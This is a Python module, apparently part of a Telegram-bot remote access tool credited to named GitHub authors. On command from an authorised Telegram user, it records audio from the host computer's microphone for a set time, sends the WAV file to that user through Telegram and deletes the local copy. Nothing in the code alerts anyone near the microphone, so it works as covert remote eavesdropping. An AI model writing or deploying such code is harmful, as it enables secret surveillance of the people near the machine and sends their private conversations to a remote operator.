##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram.types import FSInputFile
import wave
import pyaudio
import os


from config import ALLOWED_USER_ID, directory
from lib.text.texts import TEXTS, user_languages


async def start_audio_recording(message, state, recording_time: int):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'en') 

    if user_id != ALLOWED_USER_ID:
        await message.answer(TEXTS[lang]['access_denied'])
        return

    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    OUTPUT_FILENAME = "output.wav"
    save_audio = os.path.join(directory, OUTPUT_FILENAME)

    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

    await message.answer(TEXTS[lang]['recording_started'])

    frames = []
    for _ in range(0, int(RATE / CHUNK * recording_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    await message.answer(TEXTS[lang]['recording_finished'])

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open(save_audio, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    try:
        file_to_send = FSInputFile(save_audio)
        await message.answer_document(document=file_to_send, caption=TEXTS[lang]['audio_ready'])
        os.remove(save_audio)
        await state.clear()
    except Exception as e:
        await message.answer(TEXTS[lang][f'file_send_error'])
